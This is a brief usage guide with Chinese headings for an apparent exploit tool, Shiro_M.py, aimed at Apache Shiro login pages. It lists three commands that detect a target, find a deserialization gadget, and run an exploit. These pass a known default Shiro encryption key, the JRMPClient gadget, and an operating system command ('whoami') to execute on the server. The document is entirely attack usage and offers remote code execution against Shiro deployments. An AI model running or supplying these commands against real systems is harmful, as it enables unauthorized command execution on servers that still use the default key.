# 1、检测

​    python Shiro_M.py -u http://127.0.0.1:8080/login

# 2、Found gadget

​    python Shiro_M.py -u http://127.0.0.1:8080/login -t 2 -c "whoami" -k "kPH+bIxk5D2deZiIxcaaaA=="

# 3、Exp

​    python Shiro_M.py -u http://127.0.0.1:8080/login -t 3 -g "JRMPClient" -c "whoami" -k "kPH+bIxk5D2deZiIxcaaaA=="

